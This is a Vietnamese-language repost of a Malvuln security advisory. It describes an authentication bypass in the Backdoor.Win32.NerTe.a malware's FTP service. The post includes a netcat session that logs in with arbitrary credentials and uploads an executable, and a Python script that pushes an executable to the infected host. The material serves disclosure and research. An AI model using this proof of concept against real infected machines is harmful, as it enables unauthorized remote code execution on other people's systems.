---
title: Backdoor.Win32.NerTe.a / Authentication Bypass RCE
date: 16/7/2021
layout: single
header:
  teaser: /assets/images/madoc.jpg
---
## Mô Tả 
Phần mềm độc hại lắng nghe trên các cổng TCP 21, 80 và làm rơi tệp thực thi trong Windows dir. Những kẻ tấn công bên thứ ba có thể tiếp cận hệ thống bị nhiễm có thể đăng nhập bằng bất kỳ tổ hợp tên người dùng / mật khẩu nào. Những kẻ xâm nhập sau đó có thể tải lên các tệp thực thi bằng cách sử dụng lệnh ftp PASV, STOR, điều này có thể dẫn đến việc thực thi mã từ xa.
Loại: PE32

+ Đe doạ: Backdoor.Win32.NerTe.a
+ Lỗ hổng bảo mật: Bỏ qua xác thực RCE
+ MD5: 125364b0cdae80c10f00b75c8e2cfa47
+ ID Vuln: MVID-2021-0285
+ Tệp bị loại bỏ: TaskMonitors.exe
+ Tiết lộ: 07/12/2021
+ Tác giả: malvuln



## Khai thác  
```powershell
Exploit/PoC:
nc64.exe 192.168.18.127 21
220 ICS FTP Server ready.
USER mal
331 Password required for mal.
PASS vuln
230 User mal logged in.
SYST
215 UNIX Type: L8 Internet Component Suite
CDUP
250 CWD command successful. "C:/" is current directory.
PASV
227 Entering Passive Mode (192,168,18,127,195,82).
STOR DOOM.exe
150 Opening data connection for DOOM.exe.
226 File received ok

```


## Mã Kiểm Tra 
[![Language](https://img.shields.io/badge/Lang-Python-blue.svg)](https://www.python.org)

```powershell
pyinstaller --onefile -w file.py
```
```powershell
10139 INFO: checking PKG
10139 INFO: Building PKG because PKG-00.toc is non existent
10139 INFO: Building PKG (CArchive) PKG-00.pkg
11918 INFO: Building PKG (CArchive) PKG-00.pkg completed successfully.
11920 INFO: checking EXE
11920 INFO: Building EXE because EXE-00.toc is non existent
11921 INFO: Building EXE from EXE-00.toc
12000 INFO: Updating manifest in C:\x153\python\build\15\runw.exe.ix_sifg6
12064 INFO: Updating resource type 24 name 1 language 0
12067 INFO: Appending archive to EXE C:\x153\python\python\dist\15.exe
12144 INFO: Building EXE from EXE-00.toc completed successfully.
```
```python
from socket import *

MALWARE_HOST="192.168.18.127"
PORT=50002
DOOM="DOOM.exe"

def doit():
    s=socket(AF_INET, SOCK_STREAM)
    s.connect((MALWARE_HOST, PORT))

    f = open(DOOM, "rb")
    EXE = f.read()
    s.send(EXE)

    while EXE:
        s.send(EXE)
        EXE=f.read()
    
    s.close()
    
    print("Backdoor.Win32.NerTe.a / Authentication Bypass RCE")
    print("MD5: 125364b0cdae80c10f00b75c8e2cfa47")
    print("By Malvuln");

if __name__=="__main__":
    doit()

```
## Cảnh Báo
 Tác giả và người chia sẻ, không chịu trách nhiệm cho bất kỳ việc sử dụng sai thông tin trong tài liệu này và không chịu trách nhiệm cho bất kỳ thiệt hại nào gây ra bởi việc sử dụng hoặc lạm dụng thông tin này. Tác giả nghiêm cấm mọi hành vi sử dụng ác ý thông tin liên quan đến bảo mật hoặc khai thác bởi tác giả hoặc nơi khác. Đừng cố tải xuống các mẫu Phần mềm độc hại. Tác giả của trang web này không chịu trách nhiệm về bất kỳ loại thiệt hại nào xảy ra do xử lý Phần mềm độc hại không đúng cách hoặc việc tải xuống BẤT KỲ Phần mềm độc hại nào được đề cập trên trang web này hoặc ở nơi khác. Tất cả nội dung Bản quyền (c) Malvuln.com (TM).

## Cảm Ơn :D


